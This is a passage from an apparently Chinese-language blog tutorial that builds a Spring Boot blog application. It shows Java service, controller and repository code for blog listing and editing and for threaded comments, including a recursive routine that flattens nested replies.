org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findByQuery(query,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        Blog blog = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (blog == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;博客不存在哦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Blog b = <span class="keyword">new</span> Blog();</span><br><span class="line">        BeanUtils.copyProperties(blog,b);</span><br><span class="line">        String content = b.getContent();</span><br><span class="line">        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="评论模块实现"><a href="#评论模块实现" class="headerlink" title="评论模块实现"></a>评论模块实现</h3><p>CommentController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.CommentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentService commentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;comment.avatar&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String avatar;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/comments/&#123;blogId&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">comments</span><span class="params">(<span class="meta">@PathVariable</span> Long blogId, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;comments&quot;</span>,commentService.listCommentByBlogId(blogId));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog :: commentList&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/comments&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        Long blogId = comment.getBlog().getId();</span><br><span class="line">        comment.setBlog(blogService.getBlog(blogId));</span><br><span class="line">        comment.setAvatar(avatar);</span><br><span class="line">        commentService.saveComment(comment);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/comments/&quot;</span> + blogId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommentService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CommentService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Comment&gt; <span class="title">listCommentByBlogId</span><span class="params">(Long blogId)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Comment <span class="title">saveComment</span><span class="params">(Comment comment)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommentServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.CommentRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentServiceImpl</span> <span class="keyword">implements</span> <span class="title">CommentService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentRepository commentRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">listCommentByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;createTime&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> commentRepository.findByBlogId(blogId,sort);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Comment <span class="title">saveComment</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        Long parentCommentId = comment.getParentComment().getId();</span><br><span class="line">        <span class="keyword">if</span> (parentCommentId != -<span class="number">1</span>)&#123;</span><br><span class="line">            comment.setParentComment(commentRepository.findById(parentCommentId).get());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            comment.setParentComment(<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        comment.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> commentRepository.save(comment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommentRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CommentRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Comment</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Comment&gt; <span class="title">findByBlogId</span><span class="params">(Long blogId, Sort sort)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="评论模块细节优化"><a href="#评论模块细节优化" class="headerlink" title="评论模块细节优化"></a>评论模块细节优化</h3><p>CommentRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CommentRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Comment</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Comment&gt; <span class="title">findByBlogIdAndParentCommentNull</span><span class="params">(Long blogId, Sort sort)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommentServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.CommentRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentServiceImpl</span> <span class="keyword">implements</span> <span class="title">CommentService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentRepository commentRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">listCommentByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;createTime&quot;</span>);</span><br><span class="line">        List&lt;Comment&gt; comments = commentRepository.findByBlogIdAndParentCommentNull(blogId,sort);</span><br><span class="line">        <span class="keyword">return</span> eachComment(comments);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Comment <span class="title">saveComment</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        Long parentCommentId = comment.getParentComment().getId();</span><br><span class="line">        <span class="keyword">if</span> (parentCommentId != -<span class="number">1</span>)&#123;</span><br><span class="line">            comment.setParentComment(commentRepository.findById(parentCommentId).get());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            comment.setParentComment(<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        comment.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> commentRepository.save(comment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 循环每个顶级的评论节点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comments</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Comment&gt; <span class="title">eachComment</span><span class="params">(List&lt;Comment&gt; comments)</span></span>&#123;</span><br><span class="line">        List&lt;Comment&gt; commentsView = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Comment comment : comments)&#123;</span><br><span class="line">            Comment c = <span class="keyword">new</span> Comment();</span><br><span class="line">            BeanUtils.copyProperties(comment,c);</span><br><span class="line">            commentsView.add(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//合并评论的各层子代到第一级子代集合中</span></span><br><span class="line">        combineChildren(commentsView);</span><br><span class="line">        <span class="keyword">return</span> commentsView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comments root根节点，blog不为null的对象集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">combineChildren</span><span class="params">(List&lt;Comment&gt; comments)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Comment comment : comments)&#123;</span><br><span class="line">            List&lt;Comment&gt; replys = comment.getReplyComments();</span><br><span class="line">            <span class="keyword">for</span> (Comment reply : replys)&#123;</span><br><span class="line">                <span class="comment">//循环迭代,找出子代,存放在tempReplys中</span></span><br><span class="line">                recursively(reply);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//修改顶级节点的reply集合为迭代处理后的集合</span></span><br><span class="line">            comment.setReplyComments(tempReplys);</span><br><span class="line">            <span class="comment">//清除临时存放区</span></span><br><span class="line">            tempReplys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放迭代找出的所有子代的集合</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; tempReplys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归迭代，剥洋葱</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comment 被迭代的对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">recursively</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        tempReplys.add(comment);<span class="comment">//顶节点添加到临时存放集合</span></span><br><span class="line">        <span class="keyword">if</span> (comment.getReplyComments().size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;Comment&gt; replays = comment.getReplyComments();</span><br><span class="line">            <span class="keyword">for</span> (Comment reply : replays) &#123;</span><br><span class="line">                tempReplys.add(reply);</span><br><span class="line">                <span class="keyword">if</span> (reply.getReplyComments().size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                    recursively(reply);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommentController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.CommentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentService commentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;comment.avatar&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String avatar;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/comments/&#123;blogId&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">comments</span><span class="params">(<span class="meta">@PathVariable</span> Long blogId, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;comments&quot;</span>,commentService.listCommentByBlogId(blogId));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog :: commentList&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/comments&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        Long blogId = comment.getBlog().getId();</span><br><span class="line">        comment.setBlog(blogService.getBlog(blogId));</span><br><span class="line">        comment.setAvatar(avatar);</span><br><span class="line">        commentService.saveComment(comment);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/comments/&quot;</span> + blogId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="特殊用户评论模块"><a href="#特殊用户评论模块" class="headerlink" title="特殊用户评论模块"></a>特殊用户评论模块</h3><p>CommentServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.CommentRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Comment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/13.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommentServiceImpl</span> <span class="keyword">implements</span> <span class="title">CommentService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentRepository commentRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">listCommentByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.ASC,<span class="string">&quot;createTime&quot;</span>);</span><br><span class="line">        List&lt;Comment&gt; comments = commentRepository.findByBlogIdAndParentCommentNull(blogId,sort);</span><br><span class="line">        <span class="keyword">return</span> eachComment(comments);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Comment <span class="title">saveComment</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        Long parentCommentId = comment.getParentComment().getId();</span><br><span class="line">        <span class="keyword">if</span> (parentCommentId != -<span class="number">1</span>)&#123;</span><br><span class="line">            comment.setParentComment(commentRepository.findById(parentCommentId).get());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            comment.setParentComment(<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        comment.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> commentRepository.save(comment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 循环每个顶级的评论节点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comments</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Comment&gt; <span class="title">eachComment</span><span class="params">(List&lt;Comment&gt; comments)</span></span>&#123;</span><br><span class="line">        List&lt;Comment&gt; commentsView = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> 